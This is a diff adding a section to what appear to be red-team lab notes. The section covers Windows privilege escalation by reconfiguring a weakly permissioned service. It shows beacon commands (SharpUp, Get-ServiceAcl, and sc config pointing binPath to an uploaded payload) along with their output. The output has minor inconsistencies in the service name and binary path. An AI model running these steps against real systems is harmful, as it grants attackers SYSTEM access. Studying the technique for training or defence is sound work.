@@ -331,3 +331,86 @@ Simply delete the `Service.exe` and restart the endpoint.
 
 ## Weak Service Permissions
 
+### Further Triaging SharpUp Output
+
+**The following output shows that `VulnService2` is `modifiable`:**
+
+```
+beacon> execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit ModifiableServices
+
+=== Modifiable Services ===
+
+	Service 'VulnService2' (State: Running, StartMode: Auto)
+```
+
+Although it shows that it is a `modifiable` service, it still does not show exactly what those explicit permissions are, so we are going to need to enumerate further.&#x20;
+
+**We can accomplish this with the following PowerShell script, `Get-ServiceAcl.ps1` that will print out which service rights we have access to:**
+
+```
+beacon> powershell-import C:\Tools\Get-ServiceAcl.ps1
+beacon> powershell Get-ServiceAcl -Name VulnService2 | select -expand Access
+
+ServiceRights     : ChangeConfig, Start, Stop
+AccessControlType : AccessAllowed
+IdentityReference : NT AUTHORITY\Authenticated Users
+IsInherited       : False
+InheritanceFlags  : None
+PropagationFlags  : None
+```
+
+Here, we can see that all `Authenticated Users` have `ChangeConfig`, `Start` and `Stop` privileges over this service.
+
+### Abusing Weak Permissions
+
+As a result, we can abuse these weak permissions by changing the binary path of the service — so rather than running `C:\Program Files\Vulnerable Services\Service2.exe`, we can run something like `C:\Temp\Payload.exe`.
+
+1. **First, we need to validate that the current path is `"C:\Program Files\Vulnerable Services\Service 2.exe"` (also note that the path is quoted):**
+
+```
+beacon> run sc qc VulnService2
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: VulnService2
+        TYPE               : 10  WIN32_OWN_PROCESS
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : "C:\Program Files\Vulnerable Services\Service 2.exe"
+        LOAD_ORDER_GROUP   : 
+        TAG                : 0
+        DISPLAY_NAME       : VulnService2
+        DEPENDENCIES       : 
+        SERVICE_START_NAME : LocalSystem
+```
+
+2. **Next, we need to upload a service binary payload and reconfigure the binary path on the vulnerable service:**
+
+```
+beacon> mkdir C:\Temp
+beacon> cd C:\Temp
+beacon> upload C:\Payloads\tcp-local_x64.svc.exe
+
+beacon> run sc config VulnService2 binPath= C:\Temp\tcp-local_x64.svc.exe
+[SC] ChangeServiceConfig SUCCESS
+```
+
+{% hint style="info" %}
+Note: the space after `binPath=` is intentional.
+{% endhint %}
+
+3. **Now, validate that the path has indeed been updated:**
+
+```
+beacon> run sc qc VulnService2
+
+SERVICE_NAME: Vuln-Service-2
+        TYPE               : 10  WIN32_OWN_PROCESS
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\Temp\tcp-local_x64.svc.exe
+        LOAD_ORDER_GROUP   : 
+        TAG                : 0
+        DISPLAY_NAME       : VulnService2
+        DEPENDENCIES       : 
+        SERVICE_START_NAME : LocalSystem
+```
